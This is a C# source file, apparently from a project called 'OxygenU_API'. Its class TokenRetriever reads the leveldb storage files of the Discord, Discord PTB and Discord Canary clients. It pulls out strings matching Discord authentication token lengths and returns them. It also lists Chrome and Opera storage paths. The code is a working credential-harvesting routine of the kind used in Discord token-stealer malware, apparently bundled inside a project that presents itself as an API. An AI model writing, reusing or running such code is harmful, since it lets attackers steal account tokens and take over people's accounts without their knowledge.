using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;

namespace OxygenU_API
{
    class TokenRetriever
    {
        private static List<string> ReadAllLines(string file)
        {
            List<string> list = new List<string>();
            using (FileStream fileStream = File.Open(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
                {
                    while (streamReader.Peek() >= 0)
                    {
                        list.Add(streamReader.ReadLine());
                    }
                }
            }
            return list;
        }

        private static string TokenRegexCheck(string line)
        {
            foreach (object obj in TokenRetriever.tokenRegex.Matches(line))
            {
                string value = ((Match)obj).Groups[0].Value;
                if (value.Length == 59 || value.Length == 88)
                {
                    return value;
                }
            }
            return "";
        }

        private static string PerformTokenCheck(string line)
        {
            if (line.Contains("[oken"))
            {
                return TokenRetriever.TokenRegexCheck(line);
            }
            if (line.Contains(">oken"))
            {
                return TokenRetriever.TokenRegexCheck(line);
            }
            if (line.Contains("token>"))
            {
                foreach (object obj in TokenRetriever.tokenRegex.Matches(line))
                {
                    Match match = (Match)obj;
                    if (match.Length >= 59)
                    {
                        return match.Value;
                    }
                }
            }
            return "";
        }

        public static List<string> RetrieveDiscordTokens()
        {
            List<string> list = new List<string>();
            List<string> list2 = new List<string>(new string[]
            {
                TokenRetriever.discordTokenDirectory,
                TokenRetriever.ptbTokenDirectory,
                TokenRetriever.canaryTokenDirectory
            });
            List<string> list3 = new List<string>();
            foreach (string path in list2)
            {
                if (Directory.Exists(path))
                {
                    IEnumerable<string> collection = from specifiedFile in Directory.EnumerateFiles(path)
                                                     where specifiedFile.EndsWith(".ldb") || specifiedFile.EndsWith(".log")
                                                     select specifiedFile;
                    list3.AddRange(collection);
                }
            }
            foreach (string file in list3)
            {
                foreach (string line in TokenRetriever.ReadAllLines(file))
                {
                    if (!(TokenRetriever.PerformTokenCheck(line) == ""))
                    {
                        list.Add(TokenRetriever.PerformTokenCheck(line));
                    }
                }
            }
            return list;
        }

        private static readonly string tokenFileDirectory = "\\Local Storage\\leveldb";

        private static readonly string userDataDirectory = "\\User Data\\Default";

        private static readonly string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        private static readonly string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        public static readonly string temporaryDirectoryPath = Path.Combine(TokenRetriever.localAppDataPath, "\\temp");

        public static readonly string discordTokenDirectory = Path.Combine(TokenRetriever.appDataPath, "Discord" + TokenRetriever.tokenFileDirectory);

        public static readonly string ptbTokenDirectory = Path.Combine(TokenRetriever.appDataPath, "discordptb" + TokenRetriever.tokenFileDirectory);

        public static readonly string canaryTokenDirectory = Path.Combine(TokenRetriever.appDataPath, "discordcanary" + TokenRetriever.tokenFileDirectory);

        public static readonly string chromeTokenDirectory = Path.Combine(TokenRetriever.localAppDataPath, "Google\\Chrome" + TokenRetriever.userDataDirectory + TokenRetriever.tokenFileDirectory);

        public static readonly string operaTokenDirectory = Path.Combine(TokenRetriever.appDataPath, "Opera Software\\Opera Stable" + TokenRetriever.tokenFileDirectory);

        private static readonly Regex tokenRegex = new Regex("([A-Za-z0-9_\\./\\\\-]*)");
    }
}
